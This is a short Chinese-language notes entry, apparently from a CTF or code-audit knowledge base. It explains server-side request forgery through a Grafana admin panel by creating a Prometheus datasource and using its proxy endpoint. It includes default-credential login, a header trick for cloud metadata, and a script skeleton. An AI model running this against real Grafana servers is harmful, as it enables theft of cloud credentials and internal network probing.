---
title: Grafana 管理后台 SSRF
category: code-audit
tags: [ssrf, grafana, datasource, prometheus, cloud-metadata]
triggers: [grafana, ssrf, datasource, prometheus, grafana_session, 可视化平台, 管理后台]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/code-audit/Grafana管理后台SSRF.md]
---

## Summary

Grafana 管理后台通过创建 Prometheus 数据源可向任意地址发送 HTTP 请求，且支持自定义 HTTP Header。

## Details

### 利用流程

1. 登录 Grafana 管理后台（默认 `admin/admin`，或匿名访问）
2. 通过 API 创建 Prometheus 类型数据源，URL 设为攻击目标
3. 通过 `GET /api/datasource/proxy/{id}/` 触发 SSRF

### 关键注意

- 支持自定义 HTTP Header（如 `Metadata-Flavor: Google` 用于云元数据）
- SSRF 不会跟随重定向
- 可用于云元数据接口、内网服务扫描等

### 核心 Python 脚本

```python
# 创建数据源
rawBody = '{"name":"SSRF-TESTING","type":"prometheus","access":"proxy","isDefault":false}'
# 修改数据源 URL 指向目标
rawBody = '{"id":1,"name":"SSRF-TESTING","type":"prometheus","access":"proxy","url":"' + ssrf_url + '"}'
# 触发请求
GET /api/datasources/proxy/{id}/
```

## Connections

- GHSA: [[web/ghsa-ssrf-auth-bypass]]
- Related: [[ops-console-attack-surface]]
